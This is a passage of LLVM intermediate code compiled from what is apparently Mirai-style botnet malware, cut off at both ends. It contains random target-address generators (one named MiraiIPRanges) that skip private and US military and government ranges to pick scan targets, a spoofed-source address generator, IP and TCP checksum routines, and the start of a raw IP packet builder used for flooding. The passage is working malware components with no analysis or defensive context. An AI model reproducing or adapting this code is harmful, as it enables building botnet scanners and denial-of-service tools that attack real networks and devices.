  br i1 %33, label %130, label %34

34:                                               ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

38:                                               ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

42:                                               ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

46:                                               ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

50:                                               ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

54:                                               ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

58:                                               ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

62:                                               ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

66:                                               ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

70:                                               ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

74:                                               ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

78:                                               ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

82:                                               ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

86:                                               ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

90:                                               ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

94:                                               ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

98:                                               ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

102:                                              ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

106:                                              ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

110:                                              ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

114:                                              ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

118:                                              ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

126:                                              ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

130:                                              ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

132:                                              ; preds = %130
  %133 = call i32 @rand() #10
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #10
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #10
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #10
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14, !llvm.loop !31

145:                                              ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %146, i8 0, i64 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %147, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i64 0, i64 0), i32 noundef %149, i32 noundef %151, i32 noundef %153, i32 noundef %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %158 = call i32 @inet_addr(i8* noundef %157) #10
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @MiraiIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #10
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #10
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #10
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #10
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

14:                                               ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

18:                                               ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

22:                                               ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

26:                                               ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

30:                                               ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

34:                                               ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

38:                                               ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

42:                                               ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

46:                                               ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

50:                                               ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

54:                                               ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

58:                                               ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

62:                                               ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

66:                                               ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

70:                                               ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

74:                                               ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

78:                                               ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

82:                                               ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

86:                                               ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

90:                                               ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

94:                                               ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

98:                                               ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

102:                                              ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

106:                                              ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

110:                                              ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

114:                                              ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

118:                                              ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

122:                                              ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

126:                                              ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

130:                                              ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

134:                                              ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

138:                                              ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

142:                                              ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

146:                                              ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

150:                                              ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

152:                                              ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

154:                                              ; preds = %152
  %155 = call i32 @rand() #10
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #10
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #10
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #10
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14, !llvm.loop !32

167:                                              ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %168, i8 0, i64 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %169, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i64 0, i64 0), i32 noundef %171, i32 noundef %173, i32 noundef %175, i32 noundef %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %180 = call i32 @inet_addr(i8* noundef %179) #10
  ret i32 %180
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomIP(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 noundef %4) #12
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @csum(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !33

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !34

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* noundef %0, %struct.tcphdr* noundef %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 noundef zeroext 20) #12
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 noundef %28) #10
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* noundef %39, i32 noundef %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* noundef %43) #10
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #7

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* noundef %0, i32 noundef %1, i32 noundef %2, i8 noundef zeroext %3, i32 noundef %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
